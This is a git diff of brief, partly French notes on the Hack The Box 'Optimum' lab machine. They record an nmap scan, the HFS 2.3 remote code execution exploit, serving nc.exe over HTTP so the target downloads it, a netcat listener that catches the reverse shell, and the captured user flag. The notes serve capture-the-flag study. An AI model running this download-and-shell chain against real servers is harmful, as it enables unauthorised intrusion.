@@ -1,13 +1,19 @@
 # Optimum 10.10.10.8
 
+```
 OS Name:                   Microsoft Windows Server 2012 R2 Standard
 OS Version:                6.3.9600 N/A Build 9600
 31 Hotfix(s) Installed.
+```
+
+HFS 2.3 exploit
 
 
 
 # nmap
+```
 nmap -sC -sV -oA optimum 10.10.10.8
+```
 =>HFS 2.3
 
 
@@ -16,22 +22,32 @@ nmap -sC -sV -oA optimum 10.10.10.8
 ![](images/htb-optimum.png)
 
 https://www.exploit-db.com/exploits/39161
+```
 => htp2.3.py
 	ip_addr = "10.10.14.30" #local IP address
 	local_port = "4443" # Local Port number
+```
 
 L'exploit va copier http://10.10.14.30:80/nc.exe en local, et l'utiliser pour ouvrir un nc vers 10.10.14.30 4443
 
+Serve nc en HTTP 80
+```
 cp /usr/share/windows-binaries/nc.exe .
-!! 32bit ns or 64 bit nc ?
-
 python -m SimpleHTTPServer 80
+```
 
+Open a nc
+```
 nc -nlvp 4443
+```
 
+Run exploit
+```
 Python hfs2.3.py 10.10.10.8 80
+```
 
 # nc -nlvp 4443
+```
 listening on [any] 4443 ...
 ls
 connect to [10.10.14.30] from (UNKNOWN) [10.10.10.8] 49162
@@ -59,6 +75,7 @@ dir
 C:\Users\kostas\Desktop>type user.txt.txt
 type user.txt.txt
 d0c39409d7b994a9a1389ebf38ef5f73
+```
 
 # Get info
 
